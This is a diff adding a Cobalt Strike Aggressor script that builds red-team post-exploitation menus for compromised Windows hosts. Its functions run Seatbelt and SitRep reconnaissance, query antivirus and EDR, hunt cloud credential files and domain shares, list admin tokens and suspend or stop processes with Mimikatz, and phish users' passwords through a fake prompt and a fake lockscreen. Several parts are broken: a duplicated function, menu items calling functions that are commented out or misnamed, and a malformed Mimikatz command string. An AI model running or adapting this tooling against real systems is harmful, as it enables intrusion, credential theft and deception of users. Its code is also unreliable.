@@ -1,0 +1,507 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+
+
+#################################################
+
+#   Initial Checks
+
+#################################################
+menu "Initial Checks"{
+
+#Seatbelt Menu
+menu "Seatbelt"{
+
+#Seatbelt All
+item "Seatbelt (All and Full Enum Checks)  - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			seatbeltall($bid);
+		}
+	}
+	
+#Seatbelt User
+item "Seatbelt (User Checks)  - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			seatbeltuser($bid);
+		}
+	}
+
+#Seatbelt System
+item "Seatbelt (System Checks)  - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			seatbeltsystem($bid);
+		}
+	}		
+
+#Seatbelt Specified Checks
+	item "Seatbelt (Specified Check)  - T1082"{
+        prompt_text("Please Specify a CheckName", "", lambda({
+                    bexecute_assembly($bids, script_resource('/exe/Seatbelt.exe'), "$1 full");                
+                }, $bids => $1));
+			}		
+}
+
+
+#SitRep Menu
+menu "SitRep"{
+
+#SitRep - Opsec Friendly
+item "SitRep (OpSec Safe)  - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			sitrepsafe($bid);
+		}
+	}
+	
+#SitRep - LOUD	
+item "SitRep (LOUD)  - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			sitreploud($bid);
+		}
+	}
+
+}
+
+#Scout
+item "Scout - T1082"{
+	local ('$bid');
+		foreach $bid ($1){
+			scout($bid);
+		}
+	}
+}
+
+
+
+#################################################
+
+#   OPSec/CYA
+
+#################################################
+menu "OPSec/CYA"{
+
+include('/opt/cobalt_strike_extension_kit/scripts/subscripts/edr.cna')
+
+#A/V Query (Not OPSec)
+
+item "A/V Query Not OPSec  - T1063"{
+       local ('$bid');#
+		foreach $bid ($1){
+			avquery($bid);
+		}
+	}
+
+}
+
+#################################################
+
+#   Find Files
+
+#################################################
+menu "Find Files"{
+#Find Cloud Credential Files
+item "Find Cloud Creds  - T1083"{
+	local('$bid');
+		foreach $bid ($1){
+			cloudcreds($bid);
+			}
+		}
+
+#Find Domain Share
+item "Find Domain Shares  - T1135"{
+	local('$bid');
+		foreach $bid ($1){
+			finddomainshare($bid);
+		}
+	}
+				
+#Find Interesting Domain Shares 
+item "Find Interesting Domain Shares  - T1135"{
+	local('$bid');
+		foreach $bid ($1){
+			findinterestingdomainsharefile($bid);
+		}
+	}
+
+#Find File Servers 
+item "Find File Servers  - T1083"{
+	local('$bid');
+		foreach $bid ($1){
+			getnetfileserver($bid);
+		}
+	}
+}
+
+
+#################################################
+
+#   Mimikatz: Token Enumeration
+
+#################################################
+menu "Mimikatz: Token Enumeration  - T1134"{
+
+#List All Tokens
+item "List Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			tokenlist($bid);
+		}
+	}
+			
+#List Admin Tokens
+item "List Admin Tokens  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			listadmintokens($bid);
+		}			
+	}
+
+
+#List Domain Admin Tokens
+item "List Domain Admin Tokens  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			listdatokens($bid);
+		}
+	}
+
+#List Enterprise Admin Tokens
+
+item "List Enterprise Admin Tokens  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			listeatokens($bid);
+		}
+	}
+}
+#################################################
+
+#   Phishing Users
+
+#################################################
+menu "Phishing Users"{
+#Run CredPhisher
+		
+		item "Prompt for Username and Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					credphisher($bid);
+				}
+			}
+		
+			
+#Run Lock Screen Phishing Exploit
+					
+		item "Show Lockscreen to Phish Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					lockscreen($bid);
+				}
+			}
+		
+}
+
+#################################################
+
+#   Process Listing and Manipulation
+
+#################################################
+menu "Process Listing and Manipulation"{
+
+#Process Listing
+menu "Process Listing"{
+
+#PSX - Detailed List of Running Processes
+item "PSX - Running Processes  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getpsx($bid);
+		}
+	}
+	
+#PSW - Shows Window Titles from process with active Windows
+item "PSW - Active Window Processes  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getpsw($bid);
+		}
+	}
+	
+#PSM - Shows Detailed Information from a specific process id (x86)
+item "PSM - Specified PID Information (x86)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getpsmes($bid);
+		}
+	}
+	
+#PSM - Shows Detailed Information from a specific process id (x64)
+item "PSM - Specified PID Information (x64)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getpsmsf($bid);
+		}
+	}	
+	
+#PSK - Detailed list of the Windows Kernel and All Loaded Kernel Modules
+item "PSK - List of Windows Kernel and All Loaded Kernel Modules  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getpsm($bid);
+		}
+	}
+
+#MimiKatz List Processes	
+item "Mimikatz List Processes  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			mimilistprocesses($bid);
+		}
+	}
+
+#WMI - Get Processes
+item "Get Processes (WMI)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getwmiprocesses($bid);
+		}
+	}
+
+#WMI - Get Remote Processes	
+item "Get Remote Processes (WMI)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getremotewmiprocesses($bid);
+		}
+	}
+}
+
+
+
+#MimikKatz Process Manipulation
+menu "Mimikatz Process Manipulation"{
+	
+#Mimikatz - Suspend Process
+item "Suspend Process  - T1057"{
+        prompt_text("Process to Suspend - PID:", "", lambda({
+                    bmimikatz($bids, "process::suspend /pid:" . $1);
+                }, $bids => $1));
+			}
+
+#Mimikatz - Stop Process
+       item "Stop Process  - T1057"{
+        prompt_text("Process to Stop - PID:", "", lambda({
+                    bmimikatz($bids, "process::stop /pid:" . $1);
+                }, $bids => $1));
+			}
+#Mimikatz - Resume Process
+       item "Resume Process  - T1057"{
+        prompt_text("Process to Resume - PID:", "", lambda({
+                    bmimikatz($bids, "process::resume /pid:" . $1);
+                }, $bids => $1));
+			}
+
+#Mimikatz - Run  Process Process			
+       item "Run Process With Specified PPID  - T1057"{
+        prompt_text("Process to Suspend - PID:", "", "", lambda({
+                    bmimikatz($bids, "process::runp /run: . $1 /pid:" . $2);
+                }, $bids => $1, $2));
+			}
+}
+}
+
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+#################################################
+
+#   Initial Checks
+
+#################################################
+#SeatBelt
+
+#SeatBelt All Enum Checks
+sub seatbeltall{
+bexecute_assembly($1, script_resource('/exe/Seatbelt.exe'), "all full");
+}
+
+#SeatBelt User Check
+sub seatbeltuser{
+bexecute_assembly($1, script_resource('/exe/Seatbelt.exe'), "user full");
+}
+
+#SeatBelt System Check
+sub seatbeltsystem{
+bexecute_assembly($1, script_resource('/exe/Seatbelt.exe'), "system full");
+}
+
+
+#SitRep
+
+#SitRep Safe
+sub sitrepsafe{ 
+bexecute_assembly($1, script_resource('/exe/SitRep.exe'));
+}
+
+#SitRep UnSafe
+sub sitreploud{ 
+bexecute_assembly($1, script_resource('/exe/SitRep.exe'), "/AllowUnsafe");
+}
+
+#Scout
+sub scout{ 
+prompt_text("Please Specify A Machine (Must Be", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/scout.exe'), "$1");
+}, $bids => $1));
+}
+
+
+#################################################
+
+#   OPSec/CYA
+
+#################################################
+#A/V Query
+sub avquery{ 
+fireAlias($1, "AV_Query");
+}
+
+#################################################
+
+#   Find Files
+
+#################################################
+
+# Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
+}
+
+# SharpView Find Domain Share
+sub finddomainshare{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
+}
+
+# Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
+}
+
+# SharpView Find Interesting Domain Shares
+sub findinterestingdomainsharefile{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
+}
+
+# SharpView Find File Servers
+sub getnetfileserver{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
+}
+
+#################################################
+
+#   Mimikatz: Token Enumeration
+
+#################################################
+# Mimikatz List Tokens
+sub tokenlist{
+bmimikatz($1, "token::list");
+}
+
+# Mimikatz List Admin Tokens
+sub listadmintokens{
+bmimikatz($1, "token::list /admin");
+}
+
+#Mimikatz List Domain Admin Tokens
+sub listdatokens{
+bmimikatz($1, "token::list /domainadmin");
+}
+
+#Mimikatz List Enterprise Admin Tokens
+sub listeatokens{
+bmimikatz($1, "token::list /enterpriseadmin");
+}
+
+#################################################
+
+#   Phishing Users
+
+#################################################
+
+# Phish Users with small pop up box
+sub credphisher{
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+}
+
+# Phish Users with fake lockscreen
+sub lockscreen{
+bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
+}
+
+#################################################
+
+#   Process Listing and Manipulation
+
+#################################################
+
+#PSX - Detailed List of Running Processes
+sub getpsx{
+fireAlias($1, "psx");
+}
+	
+#PSW - Shows Window Titles from process with active Windows
+sub getpsw{
+fireAlias($1, "psw");
+}
+	
+#PSM - Shows Detailed Information from a specific process id (x86)
+#sub getpsmes{
+#prompt_text("Please specify a PID", "", lambda({
+#fireAlias($bids, psm), $1 x86);
+#}, $bids => $1);
+#}
+
+#PSM - Shows Detailed Information from a specific process id (x64)
+#sub getpsmsf{
+#prompt_text("Please specify a PID", "", lambda({
+#fireAlias($bids, psm), $1 x64);
+#}, $bids => $1);
+#}
+#sub getpsmsf{
+#prompt_text("Please specify a PID", "", lambda({
+#fireAlias($bids, psm, "$1");
+#}, $bids => $1));
+#}
+
+
+
+#PSK - Detailed list of the Windows Kernel and All Loaded Kernel Modules
+sub getpsk{
+fireAlias($1, "psk");
+}
+
+#Mimikatz List Process
+sub mimilistprocesses{
+bmimikatz($1, "process::list");
+}
+
+# SharpView Get-WMIProcesses
+sub getwmiprocesses{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-WMIProcess");
+}
+
+# SharpView Get-WMIProcesses Remote
+sub getremotewmiprocesses{
+prompt_text("Remote Machine - (FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-WMIProcess -ComputerName $1");
+}, $bids => $1));
+}
